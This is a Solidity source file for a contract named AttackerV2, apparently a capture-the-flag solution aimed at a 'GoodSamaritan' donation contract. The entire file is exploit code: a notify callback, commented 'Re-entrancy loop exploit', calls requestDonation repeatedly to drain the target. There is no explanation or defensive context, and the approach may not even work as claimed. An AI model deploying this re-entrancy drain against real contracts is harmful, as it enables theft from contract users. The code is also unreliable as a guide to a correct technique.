pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
}


contract AttackerV2 {
    IGoodSamaritan goodSamaritan;

    constructor(address goodSamaritanAddr) {
        goodSamaritan = IGoodSamaritan(goodSamaritanAddr);
    }

    function startAttack() external {
        goodSamaritan.requestDonation();
    }

    function notify(uint256) external {
        // Re-entrancy loop exploit
        goodSamaritan.requestDonation();
        goodSamaritan.requestDonation();
        goodSamaritan.requestDonation();
        goodSamaritan.requestDonation();
    }

    receive() external payable {
        // Accept ETH if needed
    }
}
